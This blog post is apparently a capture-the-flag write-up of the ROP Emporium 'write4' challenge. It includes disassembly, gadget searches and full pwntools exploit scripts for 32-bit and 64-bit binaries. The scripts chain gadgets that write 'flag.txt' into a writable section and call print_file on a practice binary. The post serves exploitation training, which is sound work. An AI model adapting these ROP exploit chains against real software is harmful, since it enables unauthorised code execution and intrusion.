---
layout: post
title:  "ROP Emporium: write4"
date:   2021-03-10 20:33:56 +0200
categories: ropemporium
---

## 32-bit ##
As always, let's begin by looking at the disassembly of the vulnerable function:

```
08048506 <main>:
 8048506:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804850a:       83 e4 f0                and    esp,0xfffffff0
 804850d:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 8048510:       55                      push   ebp
 8048511:       89 e5                   mov    ebp,esp
 8048513:       51                      push   ecx
 8048514:       83 ec 04                sub    esp,0x4
 8048517:       e8 94 fe ff ff          call   80483b0 <pwnme@plt>
 804851c:       b8 00 00 00 00          mov    eax,0x0
 8048521:       83 c4 04                add    esp,0x4
 8048524:       59                      pop    ecx
 8048525:       5d                      pop    ebp
 8048526:       8d 61 fc                lea    esp,[ecx-0x4]
 8048529:       c3                      ret

0804852a <usefulFunction>:
 804852a:       55                      push   ebp
 804852b:       89 e5                   mov    ebp,esp
 804852d:       83 ec 08                sub    esp,0x8
 8048530:       83 ec 0c                sub    esp,0xc
 8048533:       68 d0 85 04 08          push   0x80485d0
 8048538:       e8 93 fe ff ff          call   80483d0 <print_file@plt>
 804853d:       83 c4 10                add    esp,0x10
 8048540:       90                      nop
 8048541:       c9                      leave
 8048542:       c3                      ret

08048543 <usefulGadgets>:
 8048543:       89 2f                   mov    DWORD PTR [edi],ebp
 8048545:       c3                      ret
 8048546:       66 90                   xchg   ax,ax
 8048548:       66 90                   xchg   ax,ax
 804854a:       66 90                   xchg   ax,ax
 804854c:       66 90                   xchg   ax,ax
 804854e:       66 90                   xchg   ax,ax
```

Hmm, interesting, looks like we don't have access to the vulnerable function's disassembly, since it seems to be relocated at runtime through lazy binding.
Let's check the mitigations:
```
voidwalker@Abyss:[write4x86]** checksec ./write432
[*] '/home/voidwalker/ROPEmporium/write4x86/write432'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
```
Phew! It isn't compiled as ```PIE```!
Looking back at the website, we get a hint as to what the ```print_file()``` function does:
### Things have been rearranged a little for this challenge; the printing logic has been moved into a separate library in an attempt to mitigate the alternate solution that is possible in the callme challenge. The stack smash also takes place in a function within that library, but don't worry, this will have no effect on your ROP chain. A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument ###

Ah, I see! So the overflow offsets remain the same! What we need to do is to write somewhere in memory a string containing the name of the file we want to print (in our case ```flag.txt```) and pass it to the ```print_file()``` function. All of that through ROP!
Well, it looks like we will have to write in the memory twice, since ```flag.txt``` contains 8 bytes.
Let's look at where we could possibly write "flag.txt" in memory. We need that section to have read-write permissions obviously:

```
voidwalker@Abyss:[write4x86]** readelf -S write432
There are 30 section headers, starting at offset 0x17a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048324 000324 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
  [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001c2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485b4 0005b4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485dc 0005dc 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048620 000620 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```
Looks like we can write into the ```.bss``` section which, luckily, has its size set to exactly 8 bytes.
All we need now is to write that value through ROP. To do that we will need to be able to dereference that address of ```.bss``` and pop off the stack what we don't need to keep the flow of the ROP chain.

```
voidwalker@Abyss:[write4x86]** ropper --file write432 --search "mov|pop"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov|pop

[INFO] File: write432
0x080484e7: mov al, byte ptr [0xc9010804]; ret;
0x0804846d: mov al, byte ptr [0xd0ff0804]; add esp, 0x10; leave; ret;
0x080484ba: mov al, byte ptr [0xd2ff0804]; add esp, 0x10; leave; ret;
0x080484e4: mov byte ptr [0x804a020], 1; leave; ret;
0x08048543: mov dword ptr [edi], ebp; ret;
0x080484b2: mov ebp, esp; sub esp, 0x10; push eax; push 0x804a020; call edx;
0x08048466: mov ebp, esp; sub esp, 0x14; push 0x804a020; call eax;
0x080484da: mov ebp, esp; sub esp, 8; call 0x450; mov byte ptr [0x804a020], 1; leave; ret;
0x08048381: mov ebx, 0x81000000; ret;
0x08048423: mov ebx, dword ptr [esp]; ret;
0x0804847a: mov esp, 0x27; add bl, dh; ret;
0x08048525: pop ebp; lea esp, [ecx - 4]; ret;
0x080485ab: pop ebp; ret;
0x080485a8: pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804839d: pop ebx; ret;
0x08048524: pop ecx; pop ebp; lea esp, [ecx - 4]; ret;
0x080485aa: pop edi; pop ebp; ret;
0x080485a9: pop esi; pop edi; pop ebp; ret;
0x08048527: popal; cld; ret;
```

We have everything we need in these ROP gadgets. Let's write our script!

```python
voidwalker@Abyss:[write4x86]** cat exploit.py
#!/usr/bin/env python3

from pwn import *

context.arch = "i386"
context.bits = 32
context.endian = "little"

e = ELF("./write432")

io = e.process()

print(io.recvuntil('>'))

pop_2 = p32(0x80485aa) # pop edi; pop ebp; ret
mov = p32(0x08048543) # mov DWORD PTR [edi],ebp
bss_addr = 0x0804a020
print_file = p32(0x80483d0) # print_file@plt

payload = b'A'*44

payload += pop_2
payload += p32(bss_addr)
payload += p32(0x67616c66) # "flag"
payload += mov

payload += pop_2
payload += p32(bss_addr+0x4)
payload += p32(0x7478742e) # ".txt"
payload += mov

#return to print_file
payload += print_file
payload += pop_2
payload += p32(bss_addr)

with open('payload', 'wb') as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```
And now for tbe flag!

```
voidwalker@Abyss:[write4x86]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/write4x86/write432'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process '/home/voidwalker/ROPEmporium/write4x86/write432': pid 13738
b'write4 by ROP Emporium\nx86\n\nGo ahead and give me the input already!\n\n>'
b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

## 64-bit ##

Similarly to the previous levels, the offsets stay the same and, just like in the solution for 32-bit, the methodology is the same.

```
voidwalker@Abyss:[write4x64]** ropper --file write4 --search "mov|pop"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov|pop

[INFO] File: write4
0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x0000000000400629: mov dword ptr [rsi], edi; ret;
0x0000000000400610: mov eax, 0; pop rbp; ret;
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400609: mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005db: mov ebp, esp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400619: mov ebp, esp; mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret;
0x000000000040061b: mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret;
0x000000000040057c: mov edi, 0x601038; jmp rax;
0x0000000000400628: mov qword ptr [r14], r15; ret;
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400608: mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005da: mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400618: mov rbp, rsp; mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret;
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068e: pop r13; pop r14; pop r15; ret;
0x0000000000400690: pop r14; pop r15; ret;
0x0000000000400692: pop r15; ret;
0x000000000040057b: pop rbp; mov edi, 0x601038; jmp rax;
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068f: pop rbp; pop r14; pop r15; ret;
0x0000000000400588: pop rbp; ret;
0x0000000000400693: pop rdi; ret;
0x0000000000400691: pop rsi; pop r15; ret;
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret;
```

Oh, well... looks like we will have to make some small adjustments to our ROP chain... let's check the sections as well:

```
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
```

I think I am going to go with the ```.data``` section this time, as I want to make sure my string will have a null terminator.
As for the ROP chain itself... looks like we will have to make use of ```r14``` and ```r15``` before we make use of ```rdi```, since this seems to be the easiest memory dereferencing I can see in the actual context. Let's write our script and see if we get flag.

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.bits = 64
context.endian = "little"

e = ELF("./write4")

io = e.process()

print(io.recvuntil('>'))

pop_rdi = p64(0x400693) # pop rdi; ret
mov = p64(0x400628) # mov QWORD PTR [r14], r15; ret
pop_r14_r15 = p64(0x400690) # pop r14; pop r15; ret
data_addr = 0x601028
print_file = p64(0x400510) # print_file@plt

payload = b'A'*40

payload += pop_r14_r15
payload += p64(data_addr)
payload += p64(0x7478742e67616c66) # "flag.txt"
payload += mov

# get address of .data into rdi
payload += pop_rdi
payload += p64(data_addr)

#return to print_file
payload += print_file

with open('payload', 'wb') as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```

And, of course, we get our flag:

```
voidwalker@Abyss:[write4x64]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/write4x64/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/voidwalker/ROPEmporium/write4x64/write4': pid 15618
b'write4 by ROP Emporium\nx86_64\n\nGo ahead and give me the input already!\n\n>'
b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

